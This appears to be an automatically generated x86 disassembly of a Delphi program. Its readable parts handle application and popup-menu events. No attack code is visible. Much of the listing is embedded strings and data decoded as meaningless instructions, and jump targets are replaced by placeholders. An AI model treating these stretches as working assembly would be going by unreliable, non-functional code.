xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
rcr [ edi ] 0x1
inc edi
add [ edi * 4 + 0x3e200041 ] dh
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al cl
or eax 0x3dc40047
inc edx
add [ eax ] cl
aas
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax - 0x67ffb8f1 ] ch
pop ds
inc edi
add [ esi + ebx + 0xdf00047 ] dh
inc edi
add al bh
pop ds
inc edi
add al al
push ds
inc edi
add [ eax ] bh
pop ds
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ edi ] al
in al dx
add [ eax ] al
add [ esi ] dl
push esp
push eax
outsd
ja r-xdata
or [ edi ] eax
sbb [ edx + 0x42 ] al
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x7080300
inc ecx
push ebx
outsb
jb r-xdata
jae r-xdata
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
inc ecx
push ebx
outsb
jb r-xdata
pop es
outsb
add [ edx + edx ] bh
imul esp [ ebx + 0x61 ] 0x6e6f6974
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
test [ ecx ] dl
inc eax
add ah cl
adc [ edi ] eax
outsb
je r-xdata
popad
outsb
or dl [ gs : bp + di + 0x6c ]
jae r-xdata
jne r-xdata
jb r-xdata
outsd
ja r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11cc0040 ] al
inc edi
add ah cl
adc [ eax ] al
nop
mov ah 0x19
inc edi
add [ eax ] cl
sub [ eax + edx * 2 + 0x6f ] dl
ja r-xdata
push edi
outsb
rcpps xmm5 [ ecx + ebp * 2 + 0x64 ]
push ebx
push 0x6957776f
outsb
or al [ edx ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
outsb
je r-xdata
add [ ecx + edx + 0x11cc0040 ] al
inc edi
add [ ebp + 0x18780040 ] cl
je r-xdata
pop edi
push eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
sbb [ edi + 0x6e ] ecx
outsd
push ecx
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080005 ] al
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
lea eax [ eax ]
in al 0x1a
inc edi
add [ edi ] al
add [ ebx + 0x471a70c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx + 0x1ae40047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
sbb al [ edi ]
[ eax ] al
add [ ecx + ecx ] ah
inc edi
add [ eax ] bl
inc edx
inc edx
inc edi
jb r-xdata
outsd
je r-xdata
inc eax
add [ eax + 0x18 ] bh
outsd
outsb
insb
jae r-xdata
test al 0x14
inc esp
outsd
jne r-xdata
push edi
imul ebp [ esi + 0x64 ] 0x6542776f
outsw
jb r-xdata
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f190008 ] al
outsb
je r-xdata
push es
add [ edi ] dl
dec edi
outsb
push edi
imul ebp [ esi + 0x64 ] 0x6553776f
jb r-xdata
je r-xdata
popad
je r-xdata
outsd
outsb
inc edx
outsw
jb r-xdata
popad
outsb
add [ gs : si + 0x4011 ] al
push edx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
adc cl [ edi + 0x6e ]
push eax
jb r-xdata
inc edi
add [ eax ] bh
add bh bh
js r-xdata
test al 0x14
insb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130009 ] al
outsb
push eax
jb r-xdata
push ss
push esp
push eax
outsd
ja r-xdata
sbb al [ edi ]
pop es
adc al [ edi ]
push eax
outsd
outsb
inc ebx
insb
outsd
jae r-xdata
push edx
imul esp [ edi + 0x68 ] 0x696c4374
arpl [ ebx + 0x78 ] bp
adc eax [ edi ]
pushad
add [ eax ] al
jmp [ eax ]
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
jo r-xdata
inc edi
add [ edx + edx + 0x47 ] dh
add [ ecx + edx + 0x111c0040 ] al
inc ebp
add ah ah
sbb al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
insb
imul esp [ ebp + 0x53 ] 0x4e776f68
js r-xdata
outsd
outsb
push ebx
popad
jbe r-xdata
push ebx
jae r-xdata
jo r-xdata
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11000c ] al
outsb
dec esi
ja r-xdata
dec esp
adc al 0x47
add [ eax ] dh
add bh bh
jo r-xdata
add al ch
add [ eax ] al
inc edi
add ah dl
or [ edi ] eax
sbb [ eax ] eax
or al 0x50
outsd
ja r-xdata
push ebx
push 0x654e776f
js r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140011 ] al
outsb
push ebx
insb
imul esp [ ebp + 0x53 ] 0x4e776f68
js r-xdata
jbe r-xdata
imul esp [ ebp - 0x48 ] 0x90004715
add [ eax ] al
outsb
je r-xdata
call [ eax + 0x1ff0000 ]
outsb
outsb
je r-xdata
add [ eax + 0x4f10000e ] al
outsb
push edi
imul ebp [ esi + 0x64 ] 0x6341776f
je r-xdata
add [ eax ] al
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
adc cl [ edi + 0x6e ]
push eax
jb r-xdata
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f180007 ] al
outsb
push edi
imul ebp [ esi + 0x64 ] 0x6542776f
outsw
jb r-xdata
jb r-xdata
or al [ eax + edx * 2 ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
push eax
adc [ eax + eax ] 0x13
dec edi
inc edx
jne r-xdata
[ eax + 0x1ff0000 ]
je r-xdata
insb
je r-xdata
add al 0x15
inc edi
add [ eax - 0x7f010000 ] al
add [ eax ] al
outsb
je r-xdata
sub al 0x16
jae r-xdata
outsb
jae r-xdata
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
push 0x65676e61
add al 0x13
inc edi
add [ eax ] bl
outsd
imul ebp [ esi + 0x74 ] 0x145058
add [ eax ] dl
inc eax
jb r-xdata
jae r-xdata
insd
jae r-xdata
outsb
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130014 ] al
insb
pop esp
pop ss
inc edi
add [ eax - 0x4f010000 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
nop
add [ eax ] al
inc [ ecx ]
outsd
outsb
dec edi
add [ eax ] 0x0
inc [ ecx ]
mov al [ 0xffffffffa0004716 ]
add [ eax ] al
inc edi
add [ eax - 0x67010000 ] bl
add [ eax ] al
outsb
je r-xdata
jbe r-xdata
jae r-xdata
adc eax 0x880047
add bh bh
mov [ eax ] al
outsb
je r-xdata
add [ esi ] eax
inc ebx
popad
pop edi
push eax
jb r-xdata
inc ebx
push 0x65676e61
cmp [ fs : ecx ] bl
inc edi
add al bl
add [ eax ] al
outsb
je r-xdata
adc eax 0x6e4f1700
push ebx
insb
imul esp [ ebp + 0x53 ] 0x63656c65
je r-xdata
push ebx
insb
imul esp [ ebp - 0x44 ] 0xb8004717
add [ eax ] al
push ss
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140012 ] al
outsb
push ebx
insb
imul esp [ ebp + 0x53 ] 0x4e776f68
js r-xdata
add [ eax ] al
push [ eax + 0x1ff0000 ]
je r-xdata
outsb
je r-xdata
pushad
je r-xdata
arpl [ edx + ecx + 0x2 ] si
push 0x65
jae r-xdata
insd
je r-xdata
jbe r-xdata
outsd
outsb
inc ebx
push 0x65676e61
fcomp [ fs : eax ]
inc edi
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140016 ] al
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f12000f ] al
outsb
push edi
imul ebp [ esi + 0x64 ] 0x6544776f
popad
outsd
popad
je r-xdata
add bh bh
outsd
outsb
push ebx
popad
jbe r-xdata
outsb
sbb [ edi ] eax
fadd [ eax ]
outsd
outsb
push eax
jb r-xdata
push ecx
xor al 0x8b
push ebp
cld
mov al 0x19
inc edi
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax + 0x4f140018 ] al
outsb
push ebx
insb
imul esp [ ebp + 0x53 ] 0x4e776f68
js r-xdata
arpl [ eax + 0x65 ] bp
jmp [ eax + 0x1ff0000 ]
outsd
outsb
dec esi
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f1600
push eax
jb r-xdata
mov [ eax ] esp
jae r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ eax ] bl
dec edi
outsb
je r-xdata
inc ebx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
mov eax ebx
call sub_470f48
lea eax [ ebx + 0xec ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405b94
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0xec ] 0x0
outsb
je r-xdata
outsb
push eax
jb r-xdata
add [ eax ] al
add [ eax + 0x4f180017 ] al
sbb [ edi ] al
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
insb
imul esp [ ebx + 0x6b ] 0xba00408d
jo r-xdata
inc edi
add [ ecx - 0x723ccfb0 ] cl
inc eax
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
jne r-xdata
and [ ebx + 0xecbb ] al
add [ eax ] al
je r-xdata
outsd
outsb
inc edx
outsw
jb r-xdata
retn
push ebx
popad
sub_471f70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xec ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xec ]
call sub_405b68
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_471f98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_470d24
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_471fd0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_470d78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_471ff8
push ebp
mov ebp esp
push ecx
mov ecx 0xa
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_47259b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edx 0x7da
jg r-xdata
add edx 0xfffff825
cmp edx 0x8
ja r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4725a5
lea eax [ ebp - 0x58 ]
call sub_405b50
lea eax [ ebp - 0x54 ]
call sub_405b50
lea eax [ ebp - 0x50 ]
call sub_405b50
lea eax [ ebp - 0x4c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
lea eax [ ebp - 0x3c ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404bd4
lea eax [ ebp - 0x30 ]
call sub_405b50
lea eax [ ebp - 0x2c ]
call sub_405b50
lea eax [ ebp - 0x28 ]
call sub_405b50
lea eax [ ebp - 0x24 ]
call sub_405b50
lea eax [ ebp - 0x20 ]
call sub_405b50
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
mov ecx 0x4
call sub_404bd4
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404bd4
retn
jmp [ edx * 4 + jump_table_4720b8 ]
cmp [ ebx + 0x9a ] 0x0
je r-xdata
cmp edx 0x7d5
jg r-xdata
cmp [ ebx + 0xa2 ] 0x0
je r-xdata
cmp [ ebx + 0xaa ] 0x0
je r-xdata
cmp [ ebx + 0xb2 ] 0x0
je r-xdata
cmp [ ebx + 0xba ] 0x0
je r-xdata
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
cmp [ ebx + 0xca ] 0x0
je r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
cmp [ ebx + 0xda ] 0x0
je r-xdata
cmp [ ebx + 0xe2 ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ esi ]
mov edx [ edx + 0x18 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x30 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x30 ]
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
jmp r-xdata
sub edx 0x7d6
je r-xdata
je r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x34 ]
mov edx ebx
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x38 ]
mov edx ebx
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x3c ]
mov edx ebx
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
jmp r-xdata
lea eax [ ebp - 0x40 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x40 ]
mov edx ebx
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x44 ]
mov edx ebx
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
jmp r-xdata
lea eax [ ebp - 0x48 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x48 ]
mov edx ebx
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x4c ]
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x50 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x50 ]
mov edx ebx
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
lea eax [ ebp - 0x54 ]
mov edx [ esi ]
mov edx [ edx + 0x18 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x58 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x58 ]
mov edx ebx
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
cmp [ ebx + 0x7a ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x72 ] 0x0
je r-xdata
cmp edx 0x7d2
jg r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
jmp r-xdata
cmp [ ebx + 0x82 ] 0x0
je r-xdata
dec edx
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
jmp r-xdata
sub edx 0x7d3
je r-xdata
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
jmp r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
cmp [ ebx + 0x92 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
sub edx 0x7d2
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ esi ]
mov edx [ edx + 0x18 ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
jmp r-xdata
cmp [ ebx + 0x52 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405b94
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
sub_47261c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_472660
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_471f70
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x74 ]
call sub_405c60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472667
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_47266c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_472691
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472698
retn
sub_4726a5
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
fsub [ edi ]
inc edi
je r-xdata
int1
jb r-xdata
add [ eax ] al
insd
inc ecx
popad
jo r-xdata
add al 0x24
retn
popad
jo r-xdata
inc [ ebx - 0x23fbdbbc ]
jmp sub_405c24
outsd
je r-xdata
add [ esi + 0x27 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
daa
inc edi
add [ eax + eax ] dl
add [ eax ] al
push esp
adc al [ eax ]
fdiv [ 0x5bd00040 ]
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x10004033 ] al
push esp
inc ecx
popad
jo r-xdata
jb r-xdata
add [ ebx + 0x29 ] cl
inc edi
add [ ebp + 0x29 ] dl
inc edi
add [ edi + 0x29 ] bl
inc edi
add [ edi ] bh
sub [ edi ] eax
add al [ eax ]
add [ eax ] al
xor [ ebp + 0x5d ] ecx
jns r-xdata
jb r-xdata
daa
inc edi
add cl bh
daa
inc edi
add [ ebx ] ch
sub [ edi ] al
xor eax 0x3f004728
sub [ edi ] al
pop ds
sub [ edi ] al
add al [ eax ]
add [ eax ] al
mov al [ 0x57cba55c ]
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
or [ ebx + 0x28 ] 0x200047
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
add [ 0xfffffffff1004728 ] dl
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
add al bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
daa
inc edi
add [ eax + eax ] bl
add [ eax ] al
push esp
adc al [ eax ]
fdiv [ 0x5bd00040 ]
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x2d ] dl
inc edi
add [ ebp + ebp + 0x47 ] bh
add [ eax + 0xe00402b ] dl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0xc0040 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
adc al 0x0
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
sub ebp [ ecx ]
inc edi
add [ 0x11004729 ] dh
sub [ edi ] eax
sbb [ ecx ] ebp
inc edi
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x296cda82
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x2980da82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edx ] ch
inc edi
add [ eax + 0x4729 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sub al [ edi ]
sub [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc edi
add al bl
xor eax 0x5bd00040
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x2d ] dl
inc edi
add [ ebp + ebp + 0x47 ] bh
add [ esp + esi + 0x47 ] bh
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
scasd [ edi ]
cmp eax 0x285fda82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
clc
sub [ edi ] al
outsd
sub [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ch
inc edi
add [ eax ] ch
add [ eax ] al
add [ esi + 0x35d80047 ] ah
inc eax
add al dl
pop ebx
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x2d ] dl
inc edi
add al dl
xor [ edi ] al
or [ edi ] ch
inc edi
add [ esp + edx * 2 ] cl
inc esi
outsd
outsb
je r-xdata
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4733a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_472ea3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc edi
add [ ecx + edi + 0x39ac0047 ] cl
inc edi
add [ eax - 0xfffbd6b ] cl
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405b94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4733a8
lea eax [ ebp - 0x2c ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_42704c
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_404978
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404988
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_4270c0
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x1
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
jpo r-xdata
jo r-xdata
cmp [ edi ] eax
cmp [ edx ] bh
inc edi
add al dh
xchg ebp eax
inc edx
add [ eax + 0x3a ] bl
inc edi
add [ eax ] al
